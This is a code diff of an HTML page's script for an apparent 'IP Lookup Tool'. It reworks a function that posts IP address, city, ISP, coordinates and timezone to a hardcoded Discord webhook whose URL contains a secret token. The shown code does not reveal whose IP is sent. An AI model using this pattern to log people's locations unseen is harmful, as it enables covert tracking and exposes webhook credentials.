@@ -307,38 +307,46 @@
         }
 
         function logToDiscord(data) {
-            const webhookURL = "<https://discord.com/api/webhooks/1346896671123968082/yR-RgtuhYK3oJON5WW_dpspCRSY47EAEASWw7c8NorE46f6MB2jpS9UnFZ2qGILiJb7o>";
+            const webhookURL = "<https://discord.com/api/webhooks/1346896671123968082/yR-RgtuhYK3oJON5WW_dpspCRSY47EAEASWw7c8NorE46f6MB2jpS9UnFZ2qGILiJb7o>";  // Vervang dit met je werkelijke webhook URL
             const discordMessage = {
                 username: "IP Lookup Log",
-                content: `**IP Lookup Result**\n\n**IP Address:** ${data.ip}\n**City:** ${data.city}\n**Region:** ${data.region}\n**Country:** ${data.country}\n**ISP:** ${data.org}\n**Location:** ${data.loc}\n**Timezone:** ${data.timezone}`
+                embeds: [
+                    {
+                        title: "IP Lookup Result",
+                        color: 16711680,  // Rood
+                        fields: [
+                            { name: "IP Address", value: data.ip, inline: true },
+                            { name: "City", value: data.city, inline: true },
+                            { name: "Region", value: data.region, inline: true },
+                            { name: "Country", value: data.country, inline: true },
+                            { name: "ISP", value: data.org, inline: true },
+                            { name: "Latitude", value: data.loc.split(',')[0], inline: true },
+                            { name: "Longitude", value: data.loc.split(',')[1], inline: true },
+                            { name: "Timezone", value: data.timezone, inline: true },
+                        ],
+                        footer: { text: "IP Lookup Tool" }
+                    }
+                ]
             };
-
+            
             fetch(webhookURL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(discordMessage)
-            })
-            .then(response => response.json())
-            .then(data => console.log('Log sent to Discord:', data))
-            .catch(error => console.error('Error sending log to Discord:', error));
+            });
         }
 
         function applyCustomTheme() {
             const backgroundColor = document.getElementById('backgroundColor').value;
             const buttonColor = document.getElementById('buttonColor').value;
-
-            // Update background color and button color
             document.body.style.backgroundColor = backgroundColor;
-            document.querySelector('#lookupButton').style.backgroundColor = buttonColor;
+            document.getElementById('lookupButton').style.backgroundColor = buttonColor;
         }
 
-        // Toggle Settings Panel
-        document.getElementById("settingsIcon").onclick = () => {
-            const panel = document.getElementById('settingsPanel');
-            panel.classList.toggle('open');
-        };
+        // Open settings panel
+        document.getElementById('settingsIcon').addEventListener('click', function () {
+            document.getElementById('settingsPanel').classList.toggle('open');
+        });
     </script>
 </body>
 </html>
